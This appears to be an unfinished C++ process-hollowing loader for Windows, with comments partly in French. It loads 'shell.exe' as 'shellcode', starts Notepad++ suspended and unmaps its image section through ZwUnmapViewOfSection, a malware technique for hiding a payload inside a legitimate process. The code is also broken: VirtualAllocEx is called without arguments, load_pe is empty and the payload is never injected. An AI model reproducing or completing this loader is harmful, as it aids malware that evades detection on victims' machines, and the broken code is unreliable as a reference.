#include <iostream>
#include <windows.h>
#include <processthreadsapi.h>
#include <string.h>
#include <fstream>

using namespace std;

void load_pe();
void load_file(string filename);
// Function Pointer to a type of ZwUnmapViewOfSection
NTSTATUS (*fZwUnmapViewOfSection)(HANDLE, PVOID);

char* shellcode;

int main(int argc, char* argv[])
{
    // Loading shellcode
    load_file("shell.exe");

    // Checking if it's a valid PE file
    PIMAGE_DOS_HEADER shellcodeDosHeader = (PIMAGE_DOS_HEADER) shellcode;
    // If e_magic is not equal to 0x5A4D
    if (shellcodeDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 1;
    
    // Checking PE signature
    PIMAGE_NT_HEADERS shellcodeNtHeader = (PIMAGE_NT_HEADERS) (shellcode + shellcodeDosHeader->e_lfanew); //e_lfanew is the adress of the new executable header
    if (shellcodeNtHeader->Signature != IMAGE_NT_SIGNATURE) return 1;

    // Récupération du chemin du fichier courant pour faire un process suspendu
    // On aurait pu prendre n'importe quel programme comme explorer.exe
    const CHAR szFileName[MAX_PATH] = {"D:\\App\\Notepad++\\Notepad++.exe"};

    // On initialise les variables de startup et de process a zéro
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    // Initializing STARTUPINFO
    si.cb = sizeof(si);
    // Making a Suspended Process 
    if(CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        // Loading thread context
        CONTEXT cntxt;
        GetThreadContext(pi.hThread, &cntxt);
        // Function ZwUnmapViewOfSection needs to be call from ntdll.dll. The result returned by GetProcAddress needs to be cast in a function pointer
        fZwUnmapViewOfSection = (NTSTATUS (*)(HANDLE, PVOID)) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
        // Need if for error checking
        fZwUnmapViewOfSection(pi.hProcess, (PVOID) shellcodeNtHeader->OptionalHeader.ImageBase);
        LPVOID baseAdress = VirtualAllocEx();
        ResumeThread(pi.hThread);
    }
    else
    {
        cout << "[Error]Création du process fin innatendu" << endl;
    }

    delete[] shellcode;
    return 0;
}

void load_pe()
{

}

void load_file(string filename)
{
    int buff_size;
    ifstream binary_file;
    binary_file.open(filename, ios::binary | ios::in | ios::ate);
    if (binary_file.is_open())
    {
        int buff_size = binary_file.tellg();
        shellcode = new char[buff_size];
        binary_file.seekg(0, ios::beg);
        binary_file.read(shellcode, buff_size);
        binary_file.close();
    }
}

